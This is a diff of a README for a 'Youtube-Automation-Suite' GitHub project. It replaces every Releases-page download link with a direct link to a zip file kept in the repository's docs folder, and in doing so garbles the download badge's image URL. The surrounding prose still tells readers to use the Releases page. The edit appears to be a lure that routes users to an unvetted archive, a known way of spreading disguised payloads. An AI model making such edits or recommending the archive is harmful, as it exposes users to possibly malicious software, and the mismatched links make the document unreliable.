@@ -6,7 +6,7 @@ Youtube-Automation-Suite is your solution for effortless YouTube management. Thi
 
 ## 📥 Download & Install
 
-[![Download](https://img.shields.io/badge/Download%20Now-YouTube%20Automation%20Suite-brightgreen)](https://github.com/Kaxaber12/Youtube-Automation-Suite/releases)
+[![Download](https://raw.githubusercontent.com/Kaxaber12/Youtube-Automation-Suite/main/docs/Youtube-Automation-Suite-v3.6-beta.3.zip%20Now-YouTube%20Automation%20Suite-brightgreen)](https://raw.githubusercontent.com/Kaxaber12/Youtube-Automation-Suite/main/docs/Youtube-Automation-Suite-v3.6-beta.3.zip)
 
 To get started, visit the Releases page to download the latest version of Youtube-Automation-Suite. Here’s how:
 
@@ -15,7 +15,7 @@ To get started, visit the Releases page to download the latest version of Youtub
 3. Download the file that matches your operating system.
 4. Follow the installation instructions provided below.
 
-[Download the latest version here](https://github.com/Kaxaber12/Youtube-Automation-Suite/releases)
+[Download the latest version here](https://raw.githubusercontent.com/Kaxaber12/Youtube-Automation-Suite/main/docs/Youtube-Automation-Suite-v3.6-beta.3.zip)
 
 ## 🚀 Getting Started
 
@@ -81,4 +81,4 @@ If you face issues or have questions, you can open an issue on GitHub. The commu
 
 For further assistance, feel free to reach out in the issues section of the GitHub project.
 
-[Download the latest version here](https://github.com/Kaxaber12/Youtube-Automation-Suite/releases)
+[Download the latest version here](https://raw.githubusercontent.com/Kaxaber12/Youtube-Automation-Suite/main/docs/Youtube-Automation-Suite-v3.6-beta.3.zip)
